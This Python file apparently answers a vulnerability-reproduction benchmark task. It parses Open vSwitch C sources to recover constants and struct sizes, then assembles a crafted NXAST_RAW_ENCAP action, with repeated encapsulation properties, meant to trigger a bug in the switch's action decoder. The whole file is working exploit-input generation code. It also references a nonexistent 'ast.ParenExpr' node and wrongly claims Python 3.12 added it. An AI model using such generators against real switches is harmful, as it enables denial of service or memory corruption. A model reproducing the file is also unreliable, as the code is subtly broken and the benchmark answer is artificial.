import os
import re
import tarfile
import struct
import ast
from typing import Dict, Optional, Tuple, List, Iterable


def _round_up(n: int, m: int) -> int:
    return ((n + m - 1) // m) * m


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


class _SafeIntEval(ast.NodeVisitor):
    __slots__ = ("_names",)

    def __init__(self, names: Dict[str, int]):
        self._names = names

    def visit(self, node):
        if isinstance(node, ast.Expression):
            return self.visit(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, int):
                return int(node.value)
            if isinstance(node.value, str):
                raise ValueError("string constant not allowed")
            raise ValueError("unsupported constant")
        if isinstance(node, ast.UnaryOp):
            v = self.visit(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            if isinstance(node.op, ast.Invert):
                return ~v
            raise ValueError("bad unary op")
        if isinstance(node, ast.BinOp):
            a = self.visit(node.left)
            b = self.visit(node.right)
            op = node.op
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, ast.FloorDiv):
                return a // b
            if isinstance(op, ast.Div):
                return a // b
            if isinstance(op, ast.Mod):
                return a % b
            if isinstance(op, ast.LShift):
                return a << b
            if isinstance(op, ast.RShift):
                return a >> b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitXor):
                return a ^ b
            raise ValueError("bad bin op")
        if isinstance(node, ast.Name):
            if node.id in self._names:
                return int(self._names[node.id])
            raise ValueError(f"unknown name: {node.id}")
        if isinstance(node, ast.ParenExpr):  # python 3.12+
            return self.visit(node.expression)
        raise ValueError(f"unsupported node: {type(node).__name__}")


def _eval_c_int_expr(expr: str, known: Optional[Dict[str, int]] = None) -> int:
    if known is None:
        known = {}
    e = expr.strip()
    e = re.sub(r"\b(ULL|LLU|UL|LU|U|L)\b", "", e)
    e = re.sub(r"\(\s*[A-Za-z_]\w*\s*\)", "", e)
    e = re.sub(r"\bsizeof\s*\([^)]*\)", "0", e)
    e = re.sub(r"\s+", " ", e).strip()
    if not e:
        raise ValueError("empty expr")
    try:
        tree = ast.parse(e, mode="eval")
        return int(_SafeIntEval(known).visit(tree))
    except Exception:
        m = re.fullmatch(r"0[xX][0-9a-fA-F]+|\d+", e)
        if m:
            return int(e, 0)
        raise


def _read_source_texts(src_path: str) -> Dict[str, str]:
    texts: Dict[str, str] = {}

    def add_file(path_key: str, data: bytes) -> None:
        try:
            txt = data.decode("utf-8", "ignore")
        except Exception:
            txt = data.decode("latin-1", "ignore")
        texts[path_key] = txt

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in (".c", ".h", ".cc", ".cpp", ".inc", ".in", ".hpp"):
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size > 5_000_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        add_file(os.path.relpath(p, src_path), f.read())
                except OSError:
                    continue
        return texts

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                ext = os.path.splitext(m.name)[1].lower()
                if ext not in (".c", ".h", ".cc", ".cpp", ".inc", ".in", ".hpp"):
                    continue
                if m.size > 5_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    add_file(m.name, f.read())
                except Exception:
                    continue
    except Exception:
        pass

    return texts


def _find_text_by_pred(texts: Dict[str, str], pred) -> Optional[Tuple[str, str]]:
    for k, v in texts.items():
        if pred(k, v):
            return k, v
    return None


def _extract_brace_block(text: str, open_brace_pos: int) -> Optional[Tuple[int, int]]:
    if open_brace_pos < 0 or open_brace_pos >= len(text) or text[open_brace_pos] != "{":
        return None
    depth = 0
    i = open_brace_pos
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return open_brace_pos, i + 1
        i += 1
    return None


def _extract_function(text: str, func_name: str) -> Optional[str]:
    s = _strip_c_comments(text)
    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\([^;{]*\)\s*\{", re.M)
    m = pat.search(s)
    if not m:
        return None
    brace_pos = s.find("{", m.end() - 1)
    blk = _extract_brace_block(s, brace_pos)
    if not blk:
        return None
    a, b = blk
    return s[a:b]


def _extract_struct_body(text: str, struct_name: str) -> Optional[str]:
    s = _strip_c_comments(text)
    m = re.search(r"\bstruct\s+" + re.escape(struct_name) + r"\s*\{", s)
    if not m:
        return None
    brace_pos = s.find("{", m.end() - 1)
    blk = _extract_brace_block(s, brace_pos)
    if not blk:
        return None
    a, b = blk
    return s[a + 1 : b - 1]


def _extract_enum_body_containing(text: str, identifier: str) -> Optional[str]:
    s = _strip_c_comments(text)
    for m in re.finditer(r"\benum\b[^{;]*\{", s):
        brace_pos = s.find("{", m.end() - 1)
        blk = _extract_brace_block(s, brace_pos)
        if not blk:
            continue
        a, b = blk
        body = s[a + 1 : b - 1]
        if identifier in body:
            return body
    return None


def _parse_enum_body(body: str) -> Dict[str, int]:
    b = body
    b = re.sub(r"\s+", " ", b).strip()
    parts = [p.strip() for p in b.split(",")]
    out: Dict[str, int] = {}
    cur = -1
    known: Dict[str, int] = {}
    for item in parts:
        if not item:
            continue
        if item.startswith("}"):
            break
        item = item.strip()
        item = re.sub(r"\b__attribute__\s*\(\([^)]*\)\)", "", item).strip()
        m = re.match(r"^([A-Za-z_]\w*)\s*(?:=\s*(.+))?$", item)
        if not m:
            continue
        name = m.group(1)
        expr = m.group(2)
        if expr is None:
            val = cur + 1
        else:
            expr = expr.strip()
            expr = re.sub(r"\s*\}\s*$", "", expr).strip()
            try:
                val = _eval_c_int_expr(expr, known)
            except Exception:
                try:
                    val = int(expr, 0)
                except Exception:
                    val = cur + 1
        out[name] = int(val)
        known[name] = int(val)
        cur = int(val)
    return out


def _resolve_identifier(name: str, texts: Dict[str, str], default: Optional[int] = None) -> Optional[int]:
    define_pat = re.compile(r"^\s*#\s*define\s+" + re.escape(name) + r"\s+(.+?)\s*$", re.M)
    for _, txt in texts.items():
        if name not in txt:
            continue
        s = _strip_c_comments(txt)
        m = define_pat.search(s)
        if m:
            expr = m.group(1).strip()
            expr = re.sub(r"\s*/\*.*$", "", expr).strip()
            expr = re.sub(r"\s*//.*$", "", expr).strip()
            if expr.startswith("(") and expr.endswith(")"):
                expr = expr[1:-1].strip()
            try:
                return _eval_c_int_expr(expr)
            except Exception:
                try:
                    return int(expr, 0)
                except Exception:
                    pass

    assign_pat = re.compile(r"\b" + re.escape(name) + r"\b\s*=\s*([^,}]+)")
    for _, txt in texts.items():
        if name not in txt:
            continue
        s = _strip_c_comments(txt)
        m = assign_pat.search(s)
        if m:
            expr = m.group(1).strip()
            try:
                return _eval_c_int_expr(expr)
            except Exception:
                try:
                    return int(expr, 0)
                except Exception:
                    pass

    for _, txt in texts.items():
        if name not in txt:
            continue
        body = _extract_enum_body_containing(txt, name)
        if body:
            mp = _parse_enum_body(body)
            if name in mp:
                return mp[name]

    return default


def _resolve_struct_size(struct_name: str, texts: Dict[str, str], cache: Dict[str, int]) -> Optional[int]:
    if struct_name in cache:
        return cache[struct_name]

    for _, txt in texts.items():
        if f"struct {struct_name}" not in txt:
            continue
        s = _strip_c_comments(txt)
        m = re.search(
            r"sizeof\s*\(\s*struct\s+" + re.escape(struct_name) + r"\s*\)\s*==\s*(\d+)",
            s,
        )
        if m:
            cache[struct_name] = int(m.group(1))
            return cache[struct_name]

    body = None
    for _, txt in texts.items():
        if f"struct {struct_name}" not in txt:
            continue
        body = _extract_struct_body(txt, struct_name)
        if body is not None:
            break
    if body is None:
        return None

    field_decls = [d.strip() for d in body.split(";")]
    size = 0
    for decl in field_decls:
        if not decl:
            continue
        decl = decl.strip()
        if decl.startswith("#"):
            continue
        decl = re.sub(r"\bOVS_PACKED\b", "", decl).strip()
        if "{" in decl or "}" in decl:
            continue
        if ":" in decl:
            decl = decl.split(":", 1)[0].strip()
        if not decl:
            continue

        multi = [x.strip() for x in decl.split(",") if x.strip()]
        if len(multi) > 1:
            first = multi[0]
            m1 = re.match(r"^(.*\S)\s+([A-Za-z_]\w*)(\s*\[\s*(\d+)\s*\])?$", first)
            if not m1:
                continue
            base_type = m1.group(1).strip()
            items = [first] + multi[1:]
            for it in items:
                if it is first:
                    type_part = base_type
                    name_part = m1.group(2)
                    arrn = m1.group(4)
                else:
                    m2 = re.match(r"^([A-Za-z_]\w*)(\s*\[\s*(\d+)\s*\])?$", it)
                    if not m2:
                        continue
                    type_part = base_type
                    name_part = m2.group(1)
                    arrn = m2.group(3)
                if name_part in ("props", "properties"):
                    cache[struct_name] = size
                    return size
                fsz = _type_size(type_part, texts, cache)
                if fsz is None:
                    fsz = 4
                if arrn:
                    size += fsz * int(arrn)
                else:
                    size += fsz
            continue

        m = re.match(r"^(.*\S)\s+([A-Za-z_]\w*)(\s*\[\s*(\d+)\s*\])?$", decl)
        if not m:
            continue
        type_part = m.group(1).strip()
        name_part = m.group(2).strip()
        arrn = m.group(4)

        if name_part in ("props", "properties") and (arrn is None or arrn == "0"):
            cache[struct_name] = size
            return size

        fsz = _type_size(type_part, texts, cache)
        if fsz is None:
            fsz = 4
        if arrn:
            size += fsz * int(arrn)
        else:
            size += fsz

    cache[struct_name] = size
    return size


def _type_size(type_str: str, texts: Dict[str, str], cache: Dict[str, int]) -> Optional[int]:
    t = type_str.strip()
    t = re.sub(r"\bconst\b", "", t)
    t = re.sub(r"\bvolatile\b", "", t)
    t = re.sub(r"\brestrict\b", "", t)
    t = t.replace("*", " ").strip()
    t = re.sub(r"\s+", " ", t)

    if t.startswith("struct "):
        sn = t.split(" ", 1)[1].strip()
        if sn in cache:
            return cache[sn]
        if sn == "nx_action_header":
            cache[sn] = 16
            return 16
        if sn == "ofp_ed_prop_header":
            cache[sn] = 4
            return 4
        sz = _resolve_struct_size(sn, texts, cache)
        if sz is not None:
            cache[sn] = sz
            return sz
        return None

    base = {
        "uint8_t": 1,
        "int8_t": 1,
        "char": 1,
        "unsigned char": 1,
        "uint16_t": 2,
        "int16_t": 2,
        "short": 2,
        "unsigned short": 2,
        "ovs_be16": 2,
        "uint32_t": 4,
        "int32_t": 4,
        "int": 4,
        "unsigned": 4,
        "unsigned int": 4,
        "ovs_be32": 4,
        "uint64_t": 8,
        "int64_t": 8,
        "long long": 8,
        "unsigned long long": 8,
        "ovs_be64": 8,
        "ovs_be128": 16,
        "ofp_port_t": 4,
        "ovs_be16_t": 2,
        "ovs_be32_t": 4,
        "ovs_be64_t": 8,
        "bool": 1,
        "_Bool": 1,
    }
    if t in base:
        return base[t]
    if t.endswith("_t") and t in base:
        return base[t]
    if t.startswith("ovs_be") and t[6:].isdigit():
        n = int(t[6:])
        if n % 8 == 0:
            return n // 8
    if t.startswith("enum "):
        return 4
    if t.startswith("union "):
        return None
    if t.startswith("signed ") or t.startswith("unsigned "):
        if t in base:
            return base[t]
    return None


def _infer_fuzzer_mode(texts: Dict[str, str]) -> str:
    fuzz_files: List[Tuple[str, str]] = []
    for k, v in texts.items():
        if "LLVMFuzzerTestOneInput" in v:
            fuzz_files.append((k, v))
    if not fuzz_files:
        return "actions_only"

    best = None
    best_score = -1
    for k, v in fuzz_files:
        score = 0
        if "ofpact" in v or "ofp-actions" in v or "ofp_actions" in v:
            score += 3
        if "decode" in v:
            score += 1
        if "raw_encap" in v or "RAW_ENCAP" in v:
            score += 5
        if score > best_score:
            best = (k, v)
            best_score = score

    if best is None:
        best = fuzz_files[0]
    _, code = best

    if re.search(r"\bofp_?version\b", code) and (
        re.search(r"\bdata\s*\[\s*0\s*\]", code) or "ConsumeIntegralInRange" in code
    ):
        return "version_prefixed"

    if "FuzzedDataProvider" in code and re.search(r"ConsumeIntegral.*version", code):
        return "version_prefixed"

    if "ofpraw_pull" in code or "ofpmsg" in code:
        return "ofp_message"

    return "actions_only"


def _choose_ed_prop_from_decode(ofp_actions_text: str, texts: Dict[str, str]) -> Tuple[int, int]:
    func = _extract_function(ofp_actions_text, "decode_ed_prop")
    if not func:
        func = _extract_function(ofp_actions_text, "decode_ed_props")
    cache: Dict[str, int] = {"nx_action_header": 16, "ofp_ed_prop_header": 4}

    if not func:
        return 1, 8

    func_nc = _strip_c_comments(func)
    cases = [(m.group(1), m.start()) for m in re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", func_nc)]
    if not cases:
        return 1, 8
    cases.sort(key=lambda x: x[1])

    case_blocks: List[Tuple[str, str]] = []
    for i, (nm, pos) in enumerate(cases):
        end = cases[i + 1][1] if i + 1 < len(cases) else len(func_nc)
        block = func_nc[pos:end]
        case_blocks.append((nm, block))

    def struct_from_block(block: str) -> Optional[str]:
        m = re.search(r"\bstruct\s+(ofp_ed_prop_[A-Za-z0-9_]+)\b", block)
        if m:
            return m.group(1)
        m = re.search(r"\bstruct\s+(nx_ed_prop_[A-Za-z0-9_]+)\b", block)
        if m:
            return m.group(1)
        m = re.search(r"\bstruct\s+(ofp15_ed_prop_[A-Za-z0-9_]+)\b", block)
        if m:
            return m.group(1)
        return None

    prio_keywords = ("RAW", "HEADER", "DATA", "BYTES", "PAYLOAD", "PUSH", "POP", "L2", "ETH", "PORT")
    ordered = sorted(case_blocks, key=lambda x: sum(1 for kw in prio_keywords if kw in x[0]), reverse=True)

    for nm, block in ordered:
        st = struct_from_block(block)
        val = _resolve_identifier(nm, texts)
        if val is None:
            continue
        wire_len = None
        if st:
            wire_len = _resolve_struct_size(st, texts, cache)
        if wire_len is None:
            mlen = re.search(r"\b(?:len|prop_len|property_len)\b\s*(?:==|!=|<|<=|>=|>)\s*(\d+)", block)
            if mlen:
                wire_len = int(mlen.group(1))
        if wire_len is None:
            wire_len = 8
        wire_len = int(wire_len)
        if wire_len < 4:
            continue
        if wire_len > 256:
            continue
        if wire_len % 2 != 0:
            continue
        if wire_len < 8:
            continue
        return int(val) & 0xFFFF, wire_len

    nm, _ = ordered[0]
    val = _resolve_identifier(nm, texts, default=1)
    return int(val) & 0xFFFF, 8


def _resolve_raw_encap_base(texts: Dict[str, str]) -> int:
    cache: Dict[str, int] = {"nx_action_header": 16, "ofp_ed_prop_header": 4}
    for _, txt in texts.items():
        if "struct nx_action_raw_encap" not in txt:
            continue
        body = _extract_struct_body(txt, "nx_action_raw_encap")
        if body is None:
            continue
        # Compute offset of props/properties field.
        decls = [d.strip() for d in _strip_c_comments(body).split(";")]
        sz = 0
        for decl in decls:
            if not decl or decl.startswith("#"):
                continue
            decl = decl.strip()
            if "{" in decl or "}" in decl:
                continue
            decl = re.sub(r"\bOVS_PACKED\b", "", decl).strip()
            if ":" in decl:
                decl = decl.split(":", 1)[0].strip()
            if not decl:
                continue
            m = re.match(r"^(.*\S)\s+([A-Za-z_]\w*)\s*(\[\s*(\d*)\s*\])?$", decl)
            if not m:
                continue
            t = m.group(1).strip()
            name = m.group(2).strip()
            arr = m.group(4)
            if name in ("props", "properties"):
                return sz
            fsz = _type_size(t, texts, cache)
            if fsz is None:
                fsz = 4
            if arr is not None and arr != "":
                sz += fsz * int(arr)
            elif arr == "":
                return sz
            else:
                sz += fsz
        if sz:
            return sz
    return 24


def _build_nx_raw_encap_action(
    experimenter_id: int,
    subtype: int,
    prop_type: int,
    prop_len: int,
    base_len: int,
    total_len_target: int = 72,
) -> bytes:
    base_len = max(16, base_len)
    base_len = _round_up(base_len, 8)

    prop_len = max(8, prop_len)
    prop_len = _round_up(prop_len, 8)

    if total_len_target < base_len + prop_len:
        total_len = base_len + prop_len
        total_len = _round_up(total_len, 8)
    else:
        if (total_len_target - base_len) % prop_len == 0:
            total_len = total_len_target
        else:
            total_len = base_len + ((total_len_target - base_len + prop_len - 1) // prop_len) * prop_len
            total_len = _round_up(total_len, 8)

    nprops = max(1, (total_len - base_len) // prop_len)
    total_len = base_len + nprops * prop_len
    total_len = _round_up(total_len, 8)

    b = bytearray()
    b += struct.pack("!HHI", 0xFFFF, total_len & 0xFFFF, experimenter_id & 0xFFFFFFFF)
    b += struct.pack("!H", subtype & 0xFFFF)
    b += b"\x00" * 6

    fixed_extra = base_len - 16
    if fixed_extra > 0:
        b += b"\x00" * fixed_extra

    for i in range(nprops):
        b += struct.pack("!HH", prop_type & 0xFFFF, prop_len & 0xFFFF)
        if prop_len > 4:
            v = (i + 1) & 0xFFFFFFFF
            payload = struct.pack("!I", v) + b"\x00" * (prop_len - 8) if prop_len >= 8 else b"\x00" * (prop_len - 4)
            b += payload[: prop_len - 4]
    if len(b) < total_len:
        b += b"\x00" * (total_len - len(b))
    return bytes(b[:total_len])


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = _read_source_texts(src_path)

        exp_id = (
            _resolve_identifier("NX_EXPERIMENTER_ID", texts)
            or _resolve_identifier("NX_VENDOR_ID", texts)
            or 0x00002320
        )
        subtype = _resolve_identifier("NXAST_RAW_ENCAP", texts)
        if subtype is None:
            subtype = 0

        ofp_actions_entry = _find_text_by_pred(texts, lambda k, v: k.endswith("ofp-actions.c") or "decode_NXAST_RAW_ENCAP" in v)
        if ofp_actions_entry is None:
            ofp_actions_entry = _find_text_by_pred(texts, lambda k, v: "decode_NXAST_RAW_ENCAP" in v)
        ofp_actions_text = ofp_actions_entry[1] if ofp_actions_entry else ""

        prop_type, prop_len = _choose_ed_prop_from_decode(ofp_actions_text, texts)
        base_len = _resolve_raw_encap_base(texts)

        action = _build_nx_raw_encap_action(
            experimenter_id=int(exp_id),
            subtype=int(subtype),
            prop_type=int(prop_type),
            prop_len=int(prop_len),
            base_len=int(base_len),
            total_len_target=72,
        )

        mode = _infer_fuzzer_mode(texts)
        if mode == "version_prefixed":
            return bytes([4]) + action
        return action